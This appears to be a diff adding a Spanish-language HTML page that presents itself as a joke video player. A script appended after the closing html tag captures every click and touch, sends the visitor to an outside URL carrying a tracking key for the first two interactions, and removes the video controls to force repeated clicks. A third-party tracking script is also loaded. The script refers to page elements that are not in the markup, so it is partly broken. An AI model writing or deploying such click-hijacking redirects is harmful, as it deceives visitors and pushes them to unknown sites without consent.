@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">	
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🤣okkkkkkk🤣</title>
+</head>
+<body>
+  <div style="max-width: 100%; overflow: hidden;">
+    <video controls notautoplay style="width: 100%;">
+      <source src="https://qu.ax/GTjs.mp4" type="video/mp4">
+      Tu navegador no soporta la reproducción de videos.
+    </video>
+  </div>
+</body>
+</html>
+<script>
+        const redirectUrl = 'https://cobwebcomprehension.com/qzs3uihm1?key=8d4eed4318ba1e80ed31f14ceab1e18b'; // Replace with your URL
+        const maxRedirects = 2;
+
+        // Check if this is a new session
+        if (!sessionStorage.getItem('sessionStarted')) {
+            localStorage.removeItem('clickCount');
+            sessionStorage.setItem('sessionStarted', 'true');
+        }
+
+        // Initialize click count from localStorage or set to 0
+        let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
+
+        // Function to handle clicks
+        function handleClick(event) {
+            clickCount++;
+            localStorage.setItem('clickCount', clickCount);
+            if (clickCount <= maxRedirects) {
+                window.location.href = redirectUrl;
+                event.preventDefault();
+            } else {
+                document.getElementById('videoPlayer').setAttribute('controls', 'controls'); // Show video controls
+            }
+        }
+
+        // Function to handle touch events
+        function handleTouch(event) {
+            handleClick(event);
+        }
+
+        // Add event listeners for click and touchstart
+        document.addEventListener('click', handleClick, true); // Capture phase to ensure it catches all clicks
+        document.addEventListener('touchstart', handleTouch, true); // Capture phase to ensure it catches all touches
+
+       const videoOverlay = document.getElementById('videoOverlay');
+        videoOverlay.addEventListener('click', handleClick, true);  // Use capturing phase
+        videoOverlay.addEventListener('touchstart', handleTouch, true);  // Use capturing phase
+
+        // Initial setup: hide video controls and show overlay
+        if (clickCount <= maxRedirects) {
+            document.getElementById('videoPlayer').removeAttribute('controls');
+       
+        }
+    </script>
+
+
+<script id="_waus5u">var _wau = _wau || []; _wau.push(["small", "barriofino56", "s5u"]);</script><script async src="//waust.at/s.js"></script>
